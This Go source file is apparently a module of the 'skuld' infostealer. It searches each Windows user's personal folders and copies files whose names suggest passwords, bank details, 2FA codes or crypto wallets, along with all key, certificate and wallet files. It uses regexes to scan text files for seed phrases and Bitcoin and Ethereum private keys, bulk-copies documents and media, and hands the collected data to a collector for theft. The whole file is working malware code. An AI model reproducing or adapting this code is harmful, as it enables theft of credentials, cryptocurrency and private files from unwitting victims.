package commonfiles

import (
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
)

func Run(dataCollector *collector.DataCollector) {
	CaptureCommonFiles(dataCollector)
	CaptureCryptoFiles(dataCollector)
	CaptureAllUserFiles(dataCollector)
}

func CaptureCommonFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "commonfiles-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	extensions := []string{
		".txt", ".log", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
		".odt", ".pdf", ".rtf", ".json", ".csv", ".db", ".jpg", ".jpeg",
		".png", ".gif", ".webp", ".mp4", ".avi", ".mov", ".mkv", ".mp3",
		".wav", ".zip", ".rar", ".7z", ".key", ".pem", ".p12", ".keystore",
		".dat", ".wallet", ".backup", ".bak",
	}
	
	keywords := []string{
		"account", "password", "secret", "mdp", "motdepass", "mot_de_pass",
		"login", "paypal", "banque", "seed", "banque", "bancaire", "bank",
		"metamask", "wallet", "crypto", "exodus", "atomic", "auth", "mfa",
		"2fa", "code", "memo", "compte", "token", "password", "credit",
		"card", "mail", "address", "phone", "permis", "number", "backup",
		"database", "config", "bitcoin", "ethereum", "private", "key",
		"mnemonic", "phrase", "recovery", "electrum", "jaxx", "coinbase",
	}

	found := 0
	for _, user := range hardware.GetUsers() {
		for _, dir := range []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		} {
			if _, err := os.Stat(dir); err != nil {
				continue
			}
			
			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				if info.IsDir() {
					return nil
				}
				if info.Size() > 50*1024*1024 { // 50MB limit
					return nil
				}

				fileName := strings.ToLower(info.Name())
				fileExt := strings.ToLower(filepath.Ext(fileName))
				
				// Check if file has interesting extension
				hasValidExt := false
				for _, ext := range extensions {
					if fileExt == ext {
						hasValidExt = true
						break
					}
				}

				if !hasValidExt {
					return nil
				}

				// Check for keywords or always copy certain file types
				shouldCopy := false
				
				// Always copy these file types
				importantExts := []string{".key", ".pem", ".p12", ".keystore", ".dat", ".wallet", ".backup", ".bak"}
				for _, ext := range importantExts {
					if fileExt == ext {
						shouldCopy = true
						break
					}
				}

				// Check for keywords in filename
				if !shouldCopy {
					for _, keyword := range keywords {
						if strings.Contains(fileName, keyword) {
							shouldCopy = true
							break
						}
					}
				}

				if shouldCopy {
					destPath := filepath.Join(tempDir, strings.Split(user, "\\")[2], info.Name())
					if fileutil.Exists(destPath) {
						destPath = filepath.Join(tempDir, strings.Split(user, "\\")[2], fmt.Sprintf("%s_%s", randString(4), info.Name()))
					}
					os.MkdirAll(filepath.Join(tempDir, strings.Split(user, "\\")[2]), os.ModePerm)

					err := fileutil.CopyFile(path, destPath)
					if err == nil {
						found++
					}
				}
				return nil
			})
		}
	}

	if found == 0 {
		return
	}

	filesInfo := map[string]interface{}{
		"FilesFound": found,
		"TreeView":   fileutil.Tree(tempDir, ""),
	}
	dataCollector.AddData("commonfiles", filesInfo)
	dataCollector.AddDirectory("commonfiles", tempDir, "common_files")
}

func CaptureCryptoFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "crypto-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// Regex patterns for crypto-related content
	patterns := map[string]*regexp.Regexp{
		"mnemonic_12": regexp.MustCompile(`(?i)\b([a-z]+\s+){11}[a-z]+\b`),
		"mnemonic_24": regexp.MustCompile(`(?i)\b([a-z]+\s+){23}[a-z]+\b`),
		"bitcoin_private_key": regexp.MustCompile(`[5KL][1-9A-HJ-NP-Za-km-z]{50,51}`),
		"ethereum_private_key": regexp.MustCompile(`0x[a-fA-F0-9]{64}`),
		"bitcoin_address": regexp.MustCompile(`[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}`),
		"ethereum_address": regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
	}

	found := 0
	suspiciousFiles := make(map[string][]string)

	for _, user := range hardware.GetUsers() {
		userDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		}

		for _, dir := range userDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Only check text files
				ext := strings.ToLower(filepath.Ext(info.Name()))
				textExts := []string{".txt", ".json", ".csv", ".log", ".md", ".rtf"}
				isTextFile := false
				for _, textExt := range textExts {
					if ext == textExt {
						isTextFile = true
						break
					}
				}

				if !isTextFile || info.Size() > 1024*1024 { // 1MB limit for text files
					return nil
				}

				content, err := fileutil.ReadFile(path)
				if err != nil {
					return nil
				}

				matches := make([]string, 0)
				for patternName, pattern := range patterns {
					if pattern.MatchString(content) {
						matches = append(matches, patternName)
					}
				}

				if len(matches) > 0 {
					destPath := filepath.Join(tempDir, strings.Split(user, "\\")[2], "CryptoFiles", info.Name())
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
					
					if err := fileutil.CopyFile(path, destPath); err == nil {
						suspiciousFiles[info.Name()] = matches
						found++
					}
				}

				return nil
			})
		}
	}

	if found > 0 {
		// Create summary file
		summaryPath := filepath.Join(tempDir, "crypto_analysis.txt")
		summaryContent := "CRYPTO FILES ANALYSIS\n=====================\n\n"
		for fileName, matches := range suspiciousFiles {
			summaryContent += fmt.Sprintf("File: %s\nMatches: %s\n\n", fileName, strings.Join(matches, ", "))
		}
		fileutil.AppendFile(summaryPath, summaryContent)

		cryptoInfo := map[string]interface{}{
			"CryptoFilesFound": found,
			"SuspiciousFiles":  suspiciousFiles,
			"TreeView":         fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("crypto_files", cryptoInfo)
		dataCollector.AddDirectory("crypto_files", tempDir, "crypto_files_data")
	}
}

func CaptureAllUserFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "all-user-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// File types to capture
	allowedExts := map[string]bool{
		".txt": true, ".pdf": true, ".doc": true, ".docx": true,
		".xls": true, ".xlsx": true, ".ppt": true, ".pptx": true,
		".jpg": true, ".jpeg": true, ".png": true, ".gif": true,
		".mp4": true, ".avi": true, ".mov": true, ".mkv": true,
		".mp3": true, ".wav": true, ".json": true, ".csv": true,
		".zip": true, ".rar": true, ".7z": true, ".key": true,
		".pem": true, ".p12": true, ".keystore": true, ".dat": true,
		".wallet": true, ".backup": true, ".bak": true,
	}

	// File types to exclude
	excludedExts := map[string]bool{
		".exe": true, ".dll": true, ".sys": true, ".msi": true,
		".bat": true, ".cmd": true, ".scr": true, ".com": true,
		".pif": true, ".lnk": true, ".url": true,
	}

	totalFiles := 0
	totalSize := int64(0)

	for _, user := range hardware.GetUsers() {
		userDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
		}

		for _, dir := range userDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			dirName := filepath.Base(dir)
			userDestDir := filepath.Join(tempDir, strings.Split(user, "\\")[2], dirName)

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Skip very large files (>100MB)
				if info.Size() > 100*1024*1024 {
					return nil
				}

				ext := strings.ToLower(filepath.Ext(info.Name()))
				
				// Skip excluded file types
				if excludedExts[ext] {
					return nil
				}

				// Only copy allowed file types or files without extension
				if ext != "" && !allowedExts[ext] {
					return nil
				}

				// Create relative path
				relPath, err := filepath.Rel(dir, path)
				if err != nil {
					return nil
				}

				destPath := filepath.Join(userDestDir, relPath)
				os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

				if err := fileutil.CopyFile(path, destPath); err == nil {
					totalFiles++
					totalSize += info.Size()
				}

				return nil
			})
		}
	}

	if totalFiles > 0 {
		userFilesInfo := map[string]interface{}{
			"TotalFiles":     totalFiles,
			"TotalSizeMB":    totalSize / (1024 * 1024),
			"TreeView":       fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("all_user_files", userFilesInfo)
		dataCollector.AddDirectory("all_user_files", tempDir, "all_user_files_data")
	}
}

func randString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}